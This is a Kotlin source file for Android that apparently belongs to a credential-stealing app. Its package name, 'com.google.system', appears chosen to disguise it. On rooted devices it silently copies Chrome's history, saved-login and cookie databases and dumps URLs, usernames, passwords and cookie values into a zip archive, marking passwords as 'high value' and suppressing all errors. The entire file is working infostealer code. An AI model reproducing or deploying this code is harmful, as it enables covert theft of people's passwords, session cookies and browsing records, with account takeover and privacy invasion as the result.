package com.google.system

import android.content.Context
import android.database.sqlite.SQLiteDatabase
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

internal fun extractChromeAll(ctx: Context, hasRoot: Boolean, zos: ZipOutputStream, r: GrabResult, report: GrabReport) {
    if (!hasRoot) return
    try {
        val chromeDirs = listOf(
            "/data/data/com.android.chrome/app_chrome/Default/",
            "/data/data/com.android.chrome/app_chrome/Profile 1/",
        )
        for (baseDir in chromeDirs) {
            if (r.files >= MAX_FILES || r.size >= MAX_ZIP) break
            val historyFile = File("${baseDir}History")
            val loginFile = File("${baseDir}Login Data")
            val cookiesFile = File("${baseDir}Cookies")

            if (historyFile.exists()) extractChromeHistory(historyFile, ctx, zos, r, report)
            if (loginFile.exists()) extractChromePasswords(loginFile, ctx, zos, r, report)
            if (cookiesFile.exists()) extractChromeCookies(cookiesFile, ctx, zos, r)
        }
    } catch (_: Exception) {}
}

internal fun extractChromeHistory(historyFile: File, ctx: Context, zos: ZipOutputStream, r: GrabResult, report: GrabReport) {
    try {
        val cacheCopy = File(ctx.cacheDir, "chrome_history_${System.currentTimeMillis()}")
        runCommand("cp ${historyFile.absolutePath} ${cacheCopy.absolutePath}")
        if (!cacheCopy.exists() || cacheCopy.length() < 256) return

        val db = SQLiteDatabase.openDatabase(cacheCopy.absolutePath, null, SQLiteDatabase.OPEN_READONLY)
        try {
            val query = "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 500"
            val cursor = db.rawQuery(query, null)
            val entries = mutableListOf<String>()
            val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
            val chromeEpoch = 11644473600000L

            while (cursor.moveToNext()) {
                val url = cursor.getString(0) ?: ""
                val title = cursor.getString(1) ?: ""
                val visits = cursor.getInt(2)
                val lastVisit = cursor.getLong(3)
                val date = if (lastVisit > 0) dateFormat.format(Date((lastVisit / 10) - chromeEpoch)) else "unknown"
                entries.add("$date | $url | $title | $visits visits")
            }
            cursor.close()

            if (entries.isNotEmpty()) {
                val content = buildString {
                    appendLine("=== Chrome History ===")
                    appendLine("Total entries: ${entries.size}")
                    appendLine("Exported: ${dateFormat.format(Date())}")
                    appendLine()
                    appendLine("Timestamp | URL | Title | Visits")
                    appendLine("-".repeat(80))
                    entries.forEach { appendLine(it) }
                }
                zos.putNextEntry(ZipEntry("chrome/history.txt"))
                zos.write(content.toByteArray())
                zos.closeEntry()
                r.files++; r.size += content.length
                report.chromeUrls = entries.size
            }
        } finally {
            db.close()
            cacheCopy.delete()
        }
    } catch (_: Exception) {}
}

internal fun extractChromePasswords(loginFile: File, ctx: Context, zos: ZipOutputStream, r: GrabResult, report: GrabReport) {
    try {
        val cacheCopy = File(ctx.cacheDir, "chrome_login_${System.currentTimeMillis()}")
        runCommand("cp ${loginFile.absolutePath} ${cacheCopy.absolutePath}")
        if (!cacheCopy.exists() || cacheCopy.length() < 256) return

        val db = SQLiteDatabase.openDatabase(cacheCopy.absolutePath, null, SQLiteDatabase.OPEN_READONLY)
        try {
            val query = "SELECT origin_url, username_value, password_value FROM logins ORDER BY origin_url ASC"
            val cursor = db.rawQuery(query, null)
            val entries = mutableListOf<String>()
            var savedCount = 0

            while (cursor.moveToNext()) {
                val url = cursor.getString(0) ?: ""
                val username = cursor.getString(1) ?: ""
                val passwordBytes = cursor.getBlob(2)
                val password = if (passwordBytes != null) String(passwordBytes) else ""
                entries.add("$url | User: $username | Pass: $password")
                savedCount++
            }
            cursor.close()

            if (entries.isNotEmpty()) {
                val content = buildString {
                    appendLine("=== Chrome Saved Passwords ===")
                    appendLine("Total: $savedCount")
                    appendLine("Exported: ${SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())}")
                    appendLine()
                    entries.forEach { appendLine(it) }
                }
                zos.putNextEntry(ZipEntry("chrome/passwords.txt"))
                zos.write(content.toByteArray())
                zos.closeEntry()
                r.files++; r.size += content.length
                r.highValue += savedCount
                report.chromePasswords = savedCount
            }
        } finally {
            db.close()
            cacheCopy.delete()
        }
    } catch (_: Exception) {}
}

internal fun extractChromeCookies(cookiesFile: File, ctx: Context, zos: ZipOutputStream, r: GrabResult) {
    try {
        val cacheCopy = File(ctx.cacheDir, "chrome_cookies_${System.currentTimeMillis()}")
        runCommand("cp ${cookiesFile.absolutePath} ${cacheCopy.absolutePath}")
        if (!cacheCopy.exists() || cacheCopy.length() < 256) return

        val db = SQLiteDatabase.openDatabase(cacheCopy.absolutePath, null, SQLiteDatabase.OPEN_READONLY)
        try {
            val query = "SELECT host_key, name, value, path, expires_utc FROM cookies ORDER BY host_key ASC LIMIT 200"
            val cursor = db.rawQuery(query, null)
            val entries = mutableListOf<String>()
            while (cursor.moveToNext()) {
                val host = cursor.getString(0) ?: ""
                val name = cursor.getString(1) ?: ""
                val value = cursor.getString(2) ?: ""
                val path = cursor.getString(3) ?: ""
                entries.add("$host$path | $name = $value")
            }
            cursor.close()

            if (entries.isNotEmpty()) {
                val content = buildString {
                    appendLine("=== Chrome Cookies ===")
                    appendLine("Total: ${entries.size}")
                    entries.forEach { appendLine(it) }
                }
                zos.putNextEntry(ZipEntry("chrome/cookies.txt"))
                zos.write(content.toByteArray())
                zos.closeEntry()
                r.files++; r.size += content.length
            }
        } finally {
            db.close()
            cacheCopy.delete()
        }
    } catch (_: Exception) {}
}
